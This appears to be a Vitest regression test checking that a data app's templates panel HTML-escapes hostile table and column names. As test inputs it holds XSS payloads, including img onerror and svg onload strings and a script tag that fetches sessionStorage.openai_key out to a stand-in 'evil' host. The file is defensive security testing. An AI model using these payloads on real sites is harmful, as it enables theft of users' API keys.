// Forward-pass C1 (2026-06-02) — XSS regression for the templates
// panel's "Matched columns" line.
//
// `renderTemplateCard` builds the per-card body via `innerHTML`. Each
// piece (table name, column name, typeId) flows from a MOUNTED file:
// table/column names are xlsx / CSV / parquet headers, fully under the
// adversary's control if the user mounts a hostile file. Pre-fix, the
// `usedCols` line interpolated each piece RAW into the template
// literal; a header like `<img src=x onerror=alert(1)>` triggered XSS
// as soon as classification surfaced the column.
//
// XSS in NakliData reaches BYOK keys in sessionStorage (and any
// opt-in IDB-persisted keys) — straight exfil path via the
// wide-open `connect-src 'self' https:` policy. The fix routes every
// piece through `escapeHtml` via `formatUsedColumnsHtml`.

import { describe, expect, it } from 'vitest';
import { formatUsedColumnsHtml } from '../src/ui/templates/templates-panel.ts';

describe('formatUsedColumnsHtml — XSS guard', () => {
  it('escapes a hostile column name', () => {
    const html = formatUsedColumnsHtml({
      amount: { table: 'invoices', column: '<img src=x onerror=alert(1)>' },
    });
    // The critical guard: no LITERAL `<` survives — that's what gates
    // <img> from being parsed as a tag. The text `onerror=` is fine as
    // plain content; without an opening `<` it can never be parsed as
    // an attribute.
    expect(html).not.toContain('<img');
    expect(html).not.toMatch(/<[a-z]/i);
    // The escaped form is what should be there:
    expect(html).toContain('&lt;img');
    expect(html).toContain('&gt;');
  });

  it('escapes a hostile table name', () => {
    const html = formatUsedColumnsHtml({
      vendor: {
        table: '<script>fetch("https://evil/?k="+sessionStorage.openai_key)</script>',
        column: 'name',
      },
    });
    expect(html).not.toContain('<script');
    expect(html).toContain('&lt;script');
  });

  it('escapes a hostile typeId (defence-in-depth — typeIds are taxonomy-controlled today)', () => {
    const html = formatUsedColumnsHtml({
      '<svg onload=alert(1)>': { table: 'a', column: 'b' },
    });
    expect(html).not.toContain('<svg');
    expect(html).toContain('&lt;svg');
  });

  it('handles ampersand correctly (no double-escape regression)', () => {
    const html = formatUsedColumnsHtml({
      amount: { table: 'a&b', column: 'c&d' },
    });
    expect(html).toContain('a&amp;b');
    expect(html).toContain('c&amp;d');
    expect(html).not.toContain('a&amp;amp;b'); // not double-escaped
  });

  it('joins multiple matches with <br/> (the separator is intentional HTML)', () => {
    const html = formatUsedColumnsHtml({
      amount: { table: 't', column: 'x' },
      vendor: { table: 't', column: 'y' },
    });
    expect(html).toContain('<br/>');
    expect(html.split('<br/>').length).toBe(2);
  });

  it('skips entries with undefined ref', () => {
    const html = formatUsedColumnsHtml({
      amount: { table: 't', column: 'x' },
      vendor: undefined,
    });
    expect(html).toBe('t.x → amount');
  });

  it('returns empty string when no refs match', () => {
    expect(formatUsedColumnsHtml({})).toBe('');
    expect(formatUsedColumnsHtml({ amount: undefined })).toBe('');
  });
});
